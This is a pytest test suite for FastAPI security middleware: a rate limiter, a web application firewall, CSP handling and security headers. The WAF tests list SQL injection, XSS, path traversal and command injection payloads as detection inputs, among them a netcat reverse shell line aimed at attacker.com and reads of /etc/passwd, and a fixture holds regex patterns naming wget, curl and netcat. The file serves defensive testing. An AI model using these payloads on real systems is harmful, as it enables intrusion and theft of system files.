"""
Comprehensive Security Middleware Testing
========================================

This module provides comprehensive testing for the security middleware components
including rate limiting, WAF, CSP, and security features.
"""

import time
from datetime import datetime
from unittest.mock import Mock, patch

import pytest
from fastapi import HTTPException, Request, Response


class TestSecurityMiddleware:
    """Test suite for security middleware components."""

    @pytest.fixture
    def mock_request(self):
        """Create a mock request object."""
        request = Mock(spec=Request)
        request.client = Mock()
        request.client.host = "192.168.1.1"
        request.method = "GET"
        request.url = Mock()
        request.url.path = "/api/v1/test"
        request.headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "accept": "application/json",
            "content-type": "application/json",
        }
        request.query_params = {}
        request.path_params = {}
        request.cookies = {}
        return request

    @pytest.fixture
    def mock_response(self):
        """Create a mock response object."""
        response = Mock(spec=Response)
        response.status_code = 200
        response.headers = {}
        response.body = b'{"success": true}'
        return response

    @pytest.fixture
    def mock_asgi_app(self):
        """Create a mock ASGI application."""

        async def app(scope, receive, send):
            response = {
                "type": "http.response.start",
                "status": 200,
                "headers": [[b"content-type", b"application/json"]],
            }
            await send(response)
            await send(
                {
                    "type": "http.response.body",
                    "body": b'{"success": true}',
                }
            )

        return app

    @pytest.fixture
    def security_config(self):
        """Create security configuration."""
        return {
            "rate_limiting": {
                "enabled": True,
                "requests_per_minute": 100,
                "burst_size": 10,
                "window_size": 60,
            },
            "waf": {
                "enabled": True,
                "rules": {
                    "sql_injection": True,
                    "xss": True,
                    "path_traversal": True,
                    "command_injection": True,
                },
            },
            "csp": {
                "enabled": True,
                "default_src": ["'self'"],
                "script_src": ["'self'", "'unsafe-inline'"],
                "style_src": ["'self'", "'unsafe-inline'"],
            },
            "security_headers": {
                "x_frame_options": "DENY",
                "x_content_type_options": "nosniff",
                "x_xss_protection": "1; mode=block",
                "strict_transport_security": "max-age=31536000; includeSubDomains",
            },
        }


class TestRateLimiter:
    """Test suite for rate limiting middleware."""

    @pytest.fixture
    def rate_limiter(self):
        """Create rate limiter instance."""
        from monorepo.presentation.web.security_features import RateLimiter

        return RateLimiter(requests_per_minute=100, burst_size=10, window_size=60)

    @pytest.fixture
    def rate_limiter_storage(self):
        """Create in-memory storage for rate limiter."""
        return {}

    def test_rate_limiter_initialization(self, rate_limiter):
        """Test rate limiter initialization."""
        assert rate_limiter.requests_per_minute == 100
        assert rate_limiter.burst_size == 10
        assert rate_limiter.window_size == 60
        assert hasattr(rate_limiter, "storage")

    def test_rate_limiter_allow_request_new_client(self, rate_limiter):
        """Test rate limiter allows new client."""
        client_id = "192.168.1.1"

        # First request should be allowed
        result = rate_limiter.is_allowed(client_id)
        assert result is True

    def test_rate_limiter_within_limits(self, rate_limiter):
        """Test rate limiter allows requests within limits."""
        client_id = "192.168.1.1"

        # Make several requests within limit
        for i in range(5):
            result = rate_limiter.is_allowed(client_id)
            assert result is True

    def test_rate_limiter_burst_protection(self, rate_limiter):
        """Test rate limiter burst protection."""
        client_id = "192.168.1.1"

        # Fill up the burst capacity
        for i in range(rate_limiter.burst_size):
            result = rate_limiter.is_allowed(client_id)
            assert result is True

        # Next request should be rate limited
        result = rate_limiter.is_allowed(client_id)
        assert result is False

    def test_rate_limiter_window_reset(self, rate_limiter):
        """Test rate limiter window reset."""
        client_id = "192.168.1.1"

        # Fill up the burst capacity
        for i in range(rate_limiter.burst_size):
            rate_limiter.is_allowed(client_id)

        # Mock time advancement
        with patch("time.time", return_value=time.time() + 61):
            result = rate_limiter.is_allowed(client_id)
            assert result is True

    def test_rate_limiter_get_client_stats(self, rate_limiter):
        """Test rate limiter client statistics."""
        client_id = "192.168.1.1"

        # Make some requests
        for i in range(3):
            rate_limiter.is_allowed(client_id)

        stats = rate_limiter.get_client_stats(client_id)
        assert stats["requests_count"] == 3
        assert stats["remaining_capacity"] == rate_limiter.burst_size - 3
        assert "last_request_time" in stats

    def test_rate_limiter_cleanup_old_entries(self, rate_limiter):
        """Test rate limiter cleanup of old entries."""
        client_id = "192.168.1.1"

        # Make a request
        rate_limiter.is_allowed(client_id)

        # Mock time advancement beyond window
        with patch("time.time", return_value=time.time() + 3600):
            rate_limiter.cleanup_old_entries()

            # Client should be cleaned up
            stats = rate_limiter.get_client_stats(client_id)
            assert stats["requests_count"] == 0


class TestWAFMiddleware:
    """Test suite for Web Application Firewall middleware."""

    @pytest.fixture
    def waf_middleware(self):
        """Create WAF middleware instance."""
        from monorepo.presentation.web.security_features import WAFMiddleware

        return WAFMiddleware()

    @pytest.fixture
    def waf_patterns(self):
        """Create WAF pattern definitions."""
        return {
            "sql_injection": [
                r"(?i)(union\s+(all\s+)?select)",
                r"(?i)(select\s+.*\s+from)",
                r"(?i)(insert\s+into)",
                r"(?i)(delete\s+from)",
                r"(?i)(update\s+.*\s+set)",
                r"(?i)(drop\s+(table|database))",
                r"(?i)(exec\s*\()",
                r"(?i)(script\s*>)",
                r"(?i)(<\s*script)",
                r"(?i)(or\s+1\s*=\s*1)",
                r"(?i)(and\s+1\s*=\s*1)",
                r"(?i)(\'\s*or\s*\'\s*=\s*\')",
                r"(?i)(\'\s*and\s*\'\s*=\s*\')",
            ],
            "xss": [
                r"(?i)(<\s*script)",
                r"(?i)(javascript\s*:)",
                r"(?i)(on\w+\s*=)",
                r"(?i)(<\s*iframe)",
                r"(?i)(<\s*object)",
                r"(?i)(<\s*embed)",
                r"(?i)(<\s*link)",
                r"(?i)(<\s*meta)",
                r"(?i)(expression\s*\()",
                r"(?i)(alert\s*\()",
                r"(?i)(confirm\s*\()",
                r"(?i)(prompt\s*\()",
            ],
            "path_traversal": [
                r"(?i)(\.\.\/)",
                r"(?i)(\.\.\\)",
                r"(?i)(%2e%2e%2f)",
                r"(?i)(%2e%2e%5c)",
                r"(?i)(\.\.%2f)",
                r"(?i)(\.\.%5c)",
            ],
            "command_injection": [
                r"(?i)(;\s*(ls|dir|cat|type|more|less)\s)",
                r"(?i)(;\s*(rm|del|rmdir)\s)",
                r"(?i)(;\s*(wget|curl)\s)",
                r"(?i)(;\s*(nc|netcat)\s)",
                r"(?i)(;\s*(ps|tasklist)\s)",
                r"(?i)(;\s*(kill|taskkill)\s)",
                r"(?i)(`[^`]*`)",
                r"(?i)(\$\([^)]*\))",
                r"(?i)(&&\s*[a-zA-Z])",
                r"(?i)(\|\s*[a-zA-Z])",
            ],
        }

    def test_waf_middleware_initialization(self, waf_middleware):
        """Test WAF middleware initialization."""
        assert hasattr(waf_middleware, "patterns")
        assert hasattr(waf_middleware, "blocked_ips")
        assert hasattr(waf_middleware, "violation_log")

    def test_waf_detect_sql_injection(self, waf_middleware):
        """Test WAF detection of SQL injection attempts."""
        payloads = [
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin' --",
            "' OR 1=1 --",
        ]

        for payload in payloads:
            result = waf_middleware.check_sql_injection(payload)
            assert result is True, f"Failed to detect SQL injection: {payload}"

    def test_waf_detect_xss(self, waf_middleware):
        """Test WAF detection of XSS attempts."""
        payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<object data=javascript:alert('XSS')></object>",
        ]

        for payload in payloads:
            result = waf_middleware.check_xss(payload)
            assert result is True, f"Failed to detect XSS: {payload}"

    def test_waf_detect_path_traversal(self, waf_middleware):
        """Test WAF detection of path traversal attempts."""
        payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
        ]

        for payload in payloads:
            result = waf_middleware.check_path_traversal(payload)
            assert result is True, f"Failed to detect path traversal: {payload}"

    def test_waf_detect_command_injection(self, waf_middleware):
        """Test WAF detection of command injection attempts."""
        payloads = [
            "; cat /etc/passwd",
            "&& whoami",
            "| nc -e /bin/bash attacker.com 4444",
            "`whoami`",
            "$(cat /etc/passwd)",
        ]

        for payload in payloads:
            result = waf_middleware.check_command_injection(payload)
            assert result is True, f"Failed to detect command injection: {payload}"

    def test_waf_allow_clean_requests(self, waf_middleware):
        """Test WAF allows clean requests."""
        clean_payloads = [
            "normal text",
            "user@example.com",
            "2023-01-01",
            "product name",
            "description text",
        ]

        for payload in clean_payloads:
            result = waf_middleware.is_malicious(payload)
            assert result is False, f"Incorrectly blocked clean payload: {payload}"

    def test_waf_ip_blocking(self, waf_middleware):
        """Test WAF IP blocking functionality."""
        malicious_ip = "192.168.1.100"

        # Block the IP
        waf_middleware.block_ip(malicious_ip)

        # Check if IP is blocked
        result = waf_middleware.is_ip_blocked(malicious_ip)
        assert result is True

        # Unblock the IP
        waf_middleware.unblock_ip(malicious_ip)

        # Check if IP is unblocked
        result = waf_middleware.is_ip_blocked(malicious_ip)
        assert result is False

    def test_waf_violation_logging(self, waf_middleware):
        """Test WAF violation logging."""
        violation_data = {
            "ip": "192.168.1.100",
            "timestamp": datetime.now().isoformat(),
            "attack_type": "sql_injection",
            "payload": "' OR '1'='1",
            "url": "/api/v1/users",
        }

        waf_middleware.log_violation(violation_data)

        # Check if violation is logged
        assert len(waf_middleware.violation_log) > 0
        assert waf_middleware.violation_log[-1]["ip"] == "192.168.1.100"
        assert waf_middleware.violation_log[-1]["attack_type"] == "sql_injection"

    def test_waf_reputation_scoring(self, waf_middleware):
        """Test WAF IP reputation scoring."""
        ip = "192.168.1.100"

        # Initial score should be neutral
        score = waf_middleware.get_ip_reputation(ip)
        assert score == 0

        # Add violations
        for i in range(3):
            waf_middleware.add_violation(ip, "sql_injection")

        # Score should decrease
        score = waf_middleware.get_ip_reputation(ip)
        assert score < 0

        # IP should be automatically blocked if score is too low
        if score <= waf_middleware.auto_block_threshold:
            assert waf_middleware.is_ip_blocked(ip)


class TestCSPMiddleware:
    """Test suite for Content Security Policy middleware."""

    @pytest.fixture
    def csp_middleware(self):
        """Create CSP middleware instance."""
        from monorepo.presentation.web.security.csp_enhanced import CSPMiddleware

        return CSPMiddleware()

    @pytest.fixture
    def csp_policy(self):
        """Create CSP policy configuration."""
        return {
            "default-src": ["'self'"],
            "script-src": ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net"],
            "style-src": ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            "img-src": ["'self'", "data:", "https:"],
            "font-src": ["'self'", "https://fonts.gstatic.com"],
            "connect-src": ["'self'", "https://api.example.com"],
            "frame-src": ["'none'"],
            "object-src": ["'none'"],
            "base-uri": ["'self'"],
            "form-action": ["'self'"],
            "frame-ancestors": ["'none'"],
            "upgrade-insecure-requests": [],
            "report-uri": ["/csp-report"],
        }

    def test_csp_middleware_initialization(self, csp_middleware):
        """Test CSP middleware initialization."""
        assert hasattr(csp_middleware, "policy")
        assert hasattr(csp_middleware, "report_only")
        assert hasattr(csp_middleware, "nonce_generator")

    def test_csp_policy_generation(self, csp_middleware, csp_policy):
        """Test CSP policy string generation."""
        policy_string = csp_middleware.generate_policy_string(csp_policy)

        assert "default-src 'self'" in policy_string
        assert "script-src 'self' 'unsafe-inline'" in policy_string
        assert "frame-src 'none'" in policy_string
        assert "upgrade-insecure-requests" in policy_string

    def test_csp_nonce_generation(self, csp_middleware):
        """Test CSP nonce generation."""
        nonce = csp_middleware.generate_nonce()

        assert len(nonce) > 0
        assert isinstance(nonce, str)

        # Generate another nonce and ensure they're different
        nonce2 = csp_middleware.generate_nonce()
        assert nonce != nonce2

    def test_csp_header_application(self, csp_middleware, mock_response):
        """Test CSP header application to response."""
        policy = {"default-src": ["'self'"], "script-src": ["'self'"]}

        csp_middleware.apply_csp_header(mock_response, policy)

        assert "Content-Security-Policy" in mock_response.headers
        assert "'self'" in mock_response.headers["Content-Security-Policy"]

    def test_csp_report_only_mode(self, csp_middleware, mock_response):
        """Test CSP report-only mode."""
        policy = {"default-src": ["'self'"], "report-uri": ["/csp-report"]}

        csp_middleware.report_only = True
        csp_middleware.apply_csp_header(mock_response, policy)

        assert "Content-Security-Policy-Report-Only" in mock_response.headers
        assert "Content-Security-Policy" not in mock_response.headers

    def test_csp_violation_reporting(self, csp_middleware):
        """Test CSP violation reporting."""
        violation_data = {
            "csp-report": {
                "document-uri": "https://example.com/page",
                "referrer": "https://example.com/",
                "violated-directive": "script-src",
                "effective-directive": "script-src",
                "original-policy": "default-src 'self'; script-src 'self'",
                "blocked-uri": "https://evil.com/malicious.js",
                "source-file": "https://example.com/page",
                "line-number": 10,
                "column-number": 5,
            }
        }

        csp_middleware.handle_violation_report(violation_data)

        # Check if violation is logged
        assert len(csp_middleware.violation_reports) > 0
        assert (
            csp_middleware.violation_reports[-1]["blocked-uri"]
            == "https://evil.com/malicious.js"
        )

    def test_csp_unsafe_inline_detection(self, csp_middleware):
        """Test CSP unsafe-inline detection."""
        html_content = """
        <html>
        <body>
            <script>alert('inline script')</script>
            <div onclick="alert('inline event')">Click me</div>
            <style>body { background: red; }</style>
        </body>
        </html>
        """

        violations = csp_middleware.detect_inline_violations(html_content)

        assert len(violations) > 0
        assert any("inline script" in v["description"] for v in violations)
        assert any("inline event" in v["description"] for v in violations)

    def test_csp_nonce_injection(self, csp_middleware):
        """Test CSP nonce injection into HTML."""
        html_content = """
        <html>
        <body>
            <script>console.log('test');</script>
            <script src="external.js"></script>
        </body>
        </html>
        """

        nonce = "abc123"
        modified_html = csp_middleware.inject_nonce(html_content, nonce)

        assert f'nonce="{nonce}"' in modified_html
        assert (
            modified_html.count(f'nonce="{nonce}"') == 1
        )  # Only inline scripts get nonce


class TestSecurityHeadersMiddleware:
    """Test suite for security headers middleware."""

    @pytest.fixture
    def security_headers_middleware(self):
        """Create security headers middleware instance."""
        from monorepo.presentation.web.security_features import (
            SecurityHeadersMiddleware,
        )

        return SecurityHeadersMiddleware()

    @pytest.fixture
    def security_headers_config(self):
        """Create security headers configuration."""
        return {
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
            "Cross-Origin-Embedder-Policy": "require-corp",
            "Cross-Origin-Opener-Policy": "same-origin",
            "Cross-Origin-Resource-Policy": "cross-origin",
        }

    def test_security_headers_application(
        self, security_headers_middleware, mock_response, security_headers_config
    ):
        """Test security headers application to response."""
        security_headers_middleware.apply_headers(
            mock_response, security_headers_config
        )

        for header, value in security_headers_config.items():
            assert header in mock_response.headers
            assert mock_response.headers[header] == value

    def test_hsts_header_configuration(
        self, security_headers_middleware, mock_response
    ):
        """Test HSTS header configuration."""
        hsts_config = {"max_age": 31536000, "include_subdomains": True, "preload": True}

        security_headers_middleware.apply_hsts_header(mock_response, hsts_config)

        expected_header = "max-age=31536000; includeSubDomains; preload"
        assert mock_response.headers["Strict-Transport-Security"] == expected_header

    def test_permissions_policy_configuration(
        self, security_headers_middleware, mock_response
    ):
        """Test Permissions Policy configuration."""
        permissions_config = {
            "geolocation": [],
            "microphone": [],
            "camera": [],
            "payment": ["self"],
            "usb": [],
        }

        security_headers_middleware.apply_permissions_policy(
            mock_response, permissions_config
        )

        header_value = mock_response.headers["Permissions-Policy"]
        assert "geolocation=()" in header_value
        assert "payment=(self)" in header_value

    def test_cors_headers_configuration(
        self, security_headers_middleware, mock_response
    ):
        """Test CORS headers configuration."""
        cors_config = {
            "allow_origins": ["https://example.com"],
            "allow_methods": ["GET", "POST"],
            "allow_headers": ["Content-Type", "Authorization"],
            "expose_headers": ["X-Custom-Header"],
            "allow_credentials": True,
            "max_age": 86400,
        }

        security_headers_middleware.apply_cors_headers(mock_response, cors_config)

        assert (
            mock_response.headers["Access-Control-Allow-Origin"]
            == "https://example.com"
        )
        assert mock_response.headers["Access-Control-Allow-Methods"] == "GET, POST"
        assert mock_response.headers["Access-Control-Allow-Credentials"] == "true"

    def test_security_headers_override(
        self, security_headers_middleware, mock_response
    ):
        """Test security headers override functionality."""
        # Set initial headers
        mock_response.headers["X-Frame-Options"] = "SAMEORIGIN"

        # Override with new value
        security_headers_middleware.apply_header(
            mock_response, "X-Frame-Options", "DENY"
        )

        assert mock_response.headers["X-Frame-Options"] == "DENY"

    def test_conditional_headers_application(
        self, security_headers_middleware, mock_response
    ):
        """Test conditional headers application."""
        # Test HTTPS-only headers
        mock_request = Mock()
        mock_request.url.scheme = "https"

        security_headers_middleware.apply_conditional_headers(
            mock_response, mock_request
        )

        # HSTS should be applied for HTTPS
        assert "Strict-Transport-Security" in mock_response.headers

        # Test HTTP request
        mock_request.url.scheme = "http"
        mock_response.headers.clear()

        security_headers_middleware.apply_conditional_headers(
            mock_response, mock_request
        )

        # HSTS should not be applied for HTTP
        assert "Strict-Transport-Security" not in mock_response.headers


class TestIntegratedSecurityMiddleware:
    """Test suite for integrated security middleware stack."""

    @pytest.fixture
    def integrated_middleware(self):
        """Create integrated security middleware stack."""
        from monorepo.presentation.web.security_features import (
            IntegratedSecurityMiddleware,
        )

        return IntegratedSecurityMiddleware()

    @pytest.mark.asyncio
    async def test_middleware_stack_execution(
        self, integrated_middleware, mock_asgi_app
    ):
        """Test middleware stack execution order."""
        scope = {
            "type": "http",
            "method": "GET",
            "path": "/api/v1/test",
            "headers": [(b"host", b"example.com")],
            "client": ("192.168.1.1", 12345),
        }

        received_messages = []

        async def receive():
            return {"type": "http.request", "body": b"", "more_body": False}

        async def send(message):
            received_messages.append(message)

        # Execute middleware stack
        await integrated_middleware(scope, receive, send)

        # Check response was sent
        assert len(received_messages) >= 2
        assert received_messages[0]["type"] == "http.response.start"
        assert received_messages[1]["type"] == "http.response.body"

    @pytest.mark.asyncio
    async def test_rate_limiting_integration(
        self, integrated_middleware, mock_asgi_app
    ):
        """Test rate limiting integration in middleware stack."""
        scope = {
            "type": "http",
            "method": "GET",
            "path": "/api/v1/test",
            "headers": [(b"host", b"example.com")],
            "client": ("192.168.1.1", 12345),
        }

        async def receive():
            return {"type": "http.request", "body": b"", "more_body": False}

        async def send(message):
            pass

        # Make many requests to trigger rate limiting
        for i in range(15):
            try:
                await integrated_middleware(scope, receive, send)
            except HTTPException as e:
                if e.status_code == 429:
                    # Rate limit triggered
                    assert "Too Many Requests" in str(e.detail)
                    break
        else:
            pytest.fail("Rate limiting not triggered")

    @pytest.mark.asyncio
    async def test_waf_integration(self, integrated_middleware, mock_asgi_app):
        """Test WAF integration in middleware stack."""
        scope = {
            "type": "http",
            "method": "POST",
            "path": "/api/v1/test",
            "headers": [(b"host", b"example.com")],
            "client": ("192.168.1.1", 12345),
            "query_string": b"param=' OR '1'='1",
        }

        async def receive():
            return {"type": "http.request", "body": b"", "more_body": False}

        async def send(message):
            pass

        # Execute middleware with malicious payload
        try:
            await integrated_middleware(scope, receive, send)
            pytest.fail("WAF should have blocked malicious request")
        except HTTPException as e:
            assert e.status_code == 403
            assert "Forbidden" in str(e.detail)

    @pytest.mark.asyncio
    async def test_security_headers_integration(
        self, integrated_middleware, mock_asgi_app
    ):
        """Test security headers integration in middleware stack."""
        scope = {
            "type": "http",
            "method": "GET",
            "path": "/api/v1/test",
            "headers": [(b"host", b"example.com")],
            "client": ("192.168.1.1", 12345),
        }

        response_headers = []

        async def receive():
            return {"type": "http.request", "body": b"", "more_body": False}

        async def send(message):
            if message["type"] == "http.response.start":
                response_headers.extend(message.get("headers", []))

        # Execute middleware
        await integrated_middleware(scope, receive, send)

        # Check security headers are present
        headers_dict = {k.decode(): v.decode() for k, v in response_headers}

        assert "X-Frame-Options" in headers_dict
        assert "X-Content-Type-Options" in headers_dict
        assert "X-XSS-Protection" in headers_dict

    def test_middleware_configuration_validation(self, integrated_middleware):
        """Test middleware configuration validation."""
        config = {
            "rate_limiting": {"enabled": True, "requests_per_minute": 100},
            "waf": {"enabled": True, "rules": {"sql_injection": True}},
            "security_headers": {"enabled": True},
        }

        result = integrated_middleware.validate_config(config)
        assert result is True

        # Test invalid configuration
        invalid_config = {
            "rate_limiting": {
                "enabled": True,
                "requests_per_minute": "invalid",  # Should be int
            }
        }

        result = integrated_middleware.validate_config(invalid_config)
        assert result is False

    def test_middleware_performance_monitoring(self, integrated_middleware):
        """Test middleware performance monitoring."""
        metrics = integrated_middleware.get_performance_metrics()

        assert "request_count" in metrics
        assert "average_response_time" in metrics
        assert "blocked_requests" in metrics
        assert "rate_limited_requests" in metrics

        # Check metrics are numeric
        assert isinstance(metrics["request_count"], int)
        assert isinstance(metrics["average_response_time"], (int, float))
